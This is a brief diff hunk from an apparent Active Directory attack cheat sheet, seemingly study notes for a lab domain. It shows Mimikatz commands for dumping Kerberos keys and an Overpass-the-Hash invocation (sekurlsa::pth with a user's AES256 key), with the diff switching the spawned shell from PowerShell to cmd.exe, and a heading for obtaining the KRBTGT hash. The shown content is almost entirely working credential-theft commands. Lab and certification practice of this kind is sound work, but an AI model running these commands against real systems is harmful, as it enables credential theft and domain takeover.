@@ -86,7 +86,7 @@ C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 - **OverPass the Hash (OPTH)**
 ```powershell
 # Starts Powershell with logon type 9
-C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:us.techcorp.local /aes256:<user_aes256key> /run:powershell.exe"'
+C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:us.techcorp.local /aes256:<user_aes256key> /run:cmd.exe"'
 ```
 - **Get KRBTGT Hash**
 ```powershell
